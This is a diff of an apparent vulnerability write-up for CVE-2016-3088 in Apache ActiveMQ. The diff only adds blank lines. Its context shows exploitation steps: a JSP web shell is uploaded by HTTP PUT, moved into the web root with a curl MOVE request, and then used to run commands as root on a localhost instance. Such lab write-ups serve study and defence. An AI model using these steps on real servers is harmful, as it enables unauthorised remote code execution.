@@ -18,6 +18,7 @@ Vulnerability CVE-2016-3088 affects ActiveMQ versions prior to 5.14.0. The Activ
 ## Exploitation Walkthrough
 
 ### 1. Uploading JSP Payload via HTTP PUT
+
 Upload a JSP web shell to the writable `/fileserver/` endpoint:
 
 ```bash
@@ -39,6 +40,7 @@ if (cmd != null) {
 The server returns `HTTP/1.1 204 No Content`, confirming the file is saved.
 
 ### 2. Moving Payload to Web Root via HTTP MOVE
+
 Relocate the uploaded file into the active web application directory:
 
 ```bash
@@ -47,6 +49,7 @@ curl -i -X MOVE 'http://localhost:8126/fileserver/pwn.txt' \
 ```
 
 ### 3. Executing Commands via Web Shell
+
 Access the relocated JSP file:
 
 ```bash
@@ -54,6 +57,7 @@ curl 'http://localhost:8126/api/pwn.jsp?cmd=id'
 ```
 
 Output:
+
 ```text
 uid=0(root) gid=0(root) groups=0(root)
 ```
